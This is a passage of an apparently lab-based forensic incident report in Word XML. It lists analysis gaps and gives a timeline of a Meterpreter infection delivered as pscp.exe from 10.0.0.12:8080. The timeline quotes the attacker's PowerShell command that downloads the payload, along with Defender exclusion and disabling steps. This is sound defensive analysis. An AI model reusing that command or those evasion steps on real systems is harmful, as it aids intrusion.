        <w:t>Step 3 (Program execution): - **Q4 (C2 IP and port) is still unanswered.** Sysmon EID 3 did not log the pscp.exe or explorer 7324 Meterpreter session; only powershell 736 to 10.0.0.12 (port not yet pulled from the payload) is recorded. The port has to come from the network step: Sysmon 3 DestinationPort, the netstat output context, SRUM, and Security 5156 if it exists.</w:t>
        <w:br/>
        <w:t>- **No hashes for test.exe and 1.exe.** Neither has an Amcache or Sysmon 1 record, so they need to be hashed from disk to confirm they are the same file as pscp.exe.</w:t>
        <w:br/>
        <w:t>- **Defender history not re-checked.** Defender 1116/1117 events on test.exe were not reviewed in this step.</w:t>
        <w:br/>
        <w:t>- **Sysmon coverage gap.** Sysmon only covers activity from 10:51 onward, so anything executed before that relies on Prefetch, SRUM and PSReadLine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 4 (Persistence): - **Missing tables:** raw.native_startup, raw.native_hosts, raw.dissect_cim_consumerbindings and raw.dissect_msoffice_startup are not in the database. Startup folders and the hosts file were therefore checked through $MFT only, and WMI through the 5861 events only.</w:t>
        <w:br/>
        <w:t>- **Sysmon coverage:** registry and file telemetry exists only from 10:51:11 UTC, so persistence created before then could only be checked in the registry and file-system state at collection time.</w:t>
        <w:br/>
        <w:t>- **Partial Dissect job:** the Dissect job only partly completed.</w:t>
        <w:br/>
        <w:t>- **Not reviewed:** PendingFileRenameOperations was not found in the RECmd outputs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 5 (Accounts, authentication and privileges): I can't tell if lsass was actually dumped from the 11:03:56 remote thread. There's no credential-use evidence, and no logons happened after 10:42:23. There's no AD/DC telemetry for the Invoke-DcSync attempt: the host is in a workgroup, so no 4662 events exist.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 6 (Remote access and lateral movement): Sysmon did not log the Meterpreter reverse socket of pscp.exe or explorer 7324, so the C2 port is inferred from the staging connection. The output of netstat -ntb was not collected, and there is no packet capture or firewall connection log (no 5156 events).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 7 (User activity on files and folders): - I could not attribute any file read to the attacker: there is no Sysmon file-read event, no 4663 auditing, and the $LogFile only covers 12:08 onward.</w:t>
        <w:br/>
        <w:t>- The PowerShell transcript contents in C:\Transcript (4_WbZ_YN, _h_Jx2Ns) are not in the database.</w:t>
        <w:br/>
        <w:t>- I could not hash $RHOVDEL.exe because Amcache has no entry and I have no file access.</w:t>
        <w:br/>
        <w:t>- The NTFS last-access timestamp is unreliable.</w:t>
        <w:br/>
        <w:t>- SIDR is a dirty database, so some index content may be missing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 8 (Web browsing, downloads and e-mail): No e-mail client data (Outlook, PST/OST) and no Chromium/Chrome profile tables are in the collection, so e-mail delivery cannot be formally ruled out. Edge legacy history comes only from WebCache, parsed by Dissect, whose job finished with status 'partial'. Download records give only an end timestamp. The three earlier pscp.exe downloads that Defender caught show up only as cumulative visit counts, not as separate download records.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 9 (Defense evasion and anti-forensics): In-memory anti-forensics (e.g. Meterpreter clearev/timestomp attempts that failed, or AMSI/ETW patching) cannot be seen without a memory image. Sysmon registry coverage is limited by the SwiftOnSecurity config. Sysmon has no telemetry before 10:51:11. The PowerShell transcript content was not parsed (file contents not in the DB); only the $MFT metadata was verified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 10 (Collection, exfiltration and communications): - **Sysmon:** telemetry starts at 10:51, and the SwiftOnSecurity config does not log network events for explorer.exe or pscp.exe. The Meterpreter session socket (destination port) is therefore not observed directly; 8080 is confirmed only for HTTP staging.</w:t>
        <w:br/>
        <w:t>- **Windows Filtering Platform:** WFP 5156 auditing is not enabled.</w:t>
        <w:br/>
        <w:t>- **SRUM:** it has no destination IPs and its last interval ends at 11:43.</w:t>
        <w:br/>
        <w:t>- **Not parsed:** the OneDrive ODL logs and SyncEngineDatabase; there is no 7-Zip history table.</w:t>
        <w:br/>
        <w:t>- **No memory or PCAP:** the content of data read through the Meterpreter session (for example not_my_pass.txt) cannot be determined.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 11 (Incident timeline and correlation): No Sysmon 5 termination events and no Sysmon 3 for pscp.exe/explorer 7324 (config), so session end time and Meterpreter C2 port are inferred (10.0.0.12:8080 from powershell 736 only). No Sysmon coverage before 10:51:10 for the download phase. SHA1 of pscp.exe unavailable (no Amcache entry); test.exe/1.exe/$RHOVDEL.exe hashes not in the collection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Step 12 (Summary, answers and recommendations): The Meterpreter C2 port is not recorded, because the Sysmon configuration did not log network connections for pscp.exe or explorer.exe. test.exe, 1.exe and $RHOVDEL.exe have no hashes. No memory or network captures were available, so the activity in lsass could not be verified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Incomplete parsing sources: dissect (partial), sidr (warning).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:sectPr>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1020" w:right="1134" w:bottom="1020" w:left="1134" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Incident timeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Key events established by the analysis (UTC), with their evidence. The complete timeline of the incident window (all artifacts) is provided in incident_timeline.csv.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1871"/>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="2551"/>
        <w:gridCol w:w="5386"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="2551"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Timestamp (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Phase</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MITRE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:36</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>initial access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>User browses attacker web server http://10.0.0.12:8080/ in Edge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>WebCache records visits to http://10.0.0.12/ and http://10.0.0.12:8080/ (index listing), followed by http://10.0.0.12:8080/pscp.exe (visit_count 4/8, last 10:19:49) and download record to Downloads\pscp.exe at 10:19:53; Zone.Identifier ReferrerUrl=http://10.0.0.12:8080/.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105 T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#69</w:t>
              <w:br/>
              <w:t>dissect/browser.history.jsonl#68</w:t>
              <w:br/>
              <w:t>dissect/browser.downloads.jsonl#6</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#115204</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>initial access</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender detects Meterpreter in pscp.exe downloaded from 10.0.0.12:8080</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EID 1116 Trojan:Win64/Meterpreter.E, C:\Users\medmondson\Downloads\pscp.exe, origin http://10.0.0.12:8080/pscp.exe (repeated 10:17:53, 10:19:36).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23715</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender exclusion C:\Payloads\ added, RTP disabled at 10:19:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EID 5007 Exclusions\Paths\C:\Payloads\; EID 5001 real-time protection disabled 10:19:46 (again 11:02:12).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23724</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#23728</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#23752</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:20:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>staging</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pscp.exe copied to C:\Payloads\pscp.exe; Downloads original sent to Recycle Bin at 10:20:20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN FileCreate C:\Payloads\pscp.exe (MFT 85781, keeps Zone.Identifier HostUrl http://10.0.0.12:8080/pscp.exe); 10:20:20 Downloads\pscp.exe (MFT 85774) renamed to $Recycle.Bin\...-1001\$RHOVDEL.exe ($IHOVDEL.exe). Explorer Jump List C:\Payloads last 10:20:10.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87279</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87301</w:t>
              <w:br/>
              <w:t>rbcmd/recyclebin_0.csv#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:21:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>staging</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pscp.exe re-downloaded as C:\Payloads\test.exe via PowerShell wget</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PSReadLine "wget http://10.0.0.12:8080/pscp.exe -o test.exe"; $MFT C:\Payloads\test.exe (986,624 B) created 10:21:41.003. No execution evidence.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#109630</w:t>
              <w:br/>
              <w:t>dissect/powershell_history.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>medmondson interactive logon (LogonId 0x15347 elevated / 0x153A9) – session later used by the attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4624 LogonType 2 from 127.0.0.1; LogonId 0x15347 is the token carried by every process of the pscp.exe/Meterpreter chain (11:03–11:13).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26783</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#26784</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:51:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>context</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Context: Sysmon 15.1 installed (start of process/network telemetry)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon service installed by the lab operator; Sysmon telemetry (EID 1/3/8/11/13) exists only from 10:51:10 UTC. The download phase (10:16–10:21) is therefore covered only by Defender, WebCache, $MFT/$UsnJrnl and PowerShell logs, not by Sysmon. Lab setup activity, not attacker.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18346</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18347</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender real-time protection disabled via Windows Security UI (second time), 57 s before pscp.exe launch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>consent.exe 11:02:09 → SecurityHealthHost → MsMpEng writes DisableRealtimeMonitoring=1 (Sysmon 13), Defender 5001 at 11:02:12. The value was still set at collection time (SOFTWARE hive).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1562.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18637</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#23752</w:t>
              <w:br/>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1447</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Elevated PowerShell (PID 1088) started by user explorer; launches .\pscp.exe at 11:03:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Sysmon 1 powershell.exe GUID {e6e9f951-0de1-654e-8801-000000000500} parent explorer {e6e9f951-0907-654e-5c00-000000000500}; 4104 ".\pscp.exe" 11:03:09.878; pscp.exe PID 2196 parent GUID = 0de1…8801.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1204.002 T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18642</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#8742</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#18650</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
